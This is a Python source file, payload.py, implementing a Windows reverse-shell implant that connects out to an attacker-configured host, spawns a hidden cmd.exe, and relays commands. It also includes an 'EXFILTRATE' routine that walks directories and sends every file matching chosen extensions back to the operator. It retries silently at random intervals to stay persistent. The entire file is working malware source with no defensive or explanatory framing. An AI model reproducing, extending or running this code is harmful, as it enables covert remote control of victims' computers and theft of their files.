# payload.py
# The Heartbeat Soul, now with the wisdom of the archivist.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096

def send_file_reliably(s_obj, file_path):
    """Sends a single file with lossless protocol."""
    try:
        file_size = os.path.getsize(file_path)
        
        # 1. Calculate checksum
        hasher = hashlib.sha256()
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                hasher.update(chunk)
        file_hash = hasher.hexdigest()

        # 2. Send file header: FILENAME::FILESIZE::FILEHASH
        header = f"{os.path.basename(file_path)}::{file_size}::{file_hash}"
        s_obj.sendall(header.encode('utf-8'))

        # 3. Wait for ACK from server to begin transfer
        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_HEADER':
            return # Server did not acknowledge header, abort.

        # 4. Send file content in chunks
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                s_obj.sendall(chunk)
        
        # 5. Wait for final verification result from server
        final_status = s_obj.recv(1024).decode('utf-8')
        # We could log this status, but for now, we simply proceed.

    except Exception:
        # Fails silently if a single file transfer has an error
        try:
            s_obj.sendall(b'FAIL_SEND')
        except:
            pass

def handle_exfiltration(s_obj, command):
    """Finds and sends files based on the exfiltrate command."""
    try:
        _, root_path, extensions_str = command.split('::')
        extensions = [ext.strip() for ext in extensions_str.split(',')]
        
        # Find all matching files
        found_files = []
        for dirpath, _, filenames in os.walk(root_path):
            for filename in filenames:
                if any(filename.endswith(ext) for ext in extensions):
                    found_files.append(os.path.join(dirpath, filename))

        # Inform the commander of how many files to expect
        s_obj.sendall(f"COUNT::{len(found_files)}".encode('utf-8'))
        
        # Wait for ACK before starting
        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_COUNT':
            return

        # Send each file
        for file_path in found_files:
            send_file_reliably(s_obj, file_path)

    except Exception:
        # If the whole process fails, notify the commander
        try:
            s_obj.sendall(b'FAIL_EXFIL')
        except:
            pass
    finally:
        # Signal that the exfiltration task is complete
        try:
            # Short delay to prevent messages from sticking together
            time.sleep(0.1)
            s_obj.sendall(b'END_EXFIL')
        except:
            pass


def run_conduit():
    """The main reverse shell loop with command parsing."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, shell=True)
            
            # --- Thread to send shell output to master ---
            def shell_to_master():
                # Send initial prompt
                initial_prompt = p.stdout.read(p.stdout.peek().__len__()) if p.stdout.peek() else b''
                initial_prompt += p.stderr.read(p.stderr.peek().__len__()) if p.stderr.peek() else b''
                initial_prompt += os.getcwd().encode('utf-8') + b'>'
                s_obj.sendall(initial_prompt)

                while True:
                    try:
                        # Non-blocking read
                        output = p.stdout.read(1) + p.stderr.read(1)
                        if output:
                            s_obj.sendall(output)
                        time.sleep(0.01) # prevent high CPU usage
                    except:
                        break
                s_obj.close()

            # --- Start the output thread ---
            out_thread = threading.Thread(target=shell_to_master, daemon=True)
            out_thread.start()

            # --- Main loop to receive commands from master ---
            while True:
                data = s_obj.recv(1024)
                if not data:
                    break
                
                command = data.decode('utf-8', errors='ignore').strip()

                if command.startswith('EXFILTRATE::'):
                    handle_exfiltration(s_obj, command)
                elif command.lower() == 'exit':
                    break
                else:
                    p.stdin.write(data + b'\n')
                    p.stdin.flush()

            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()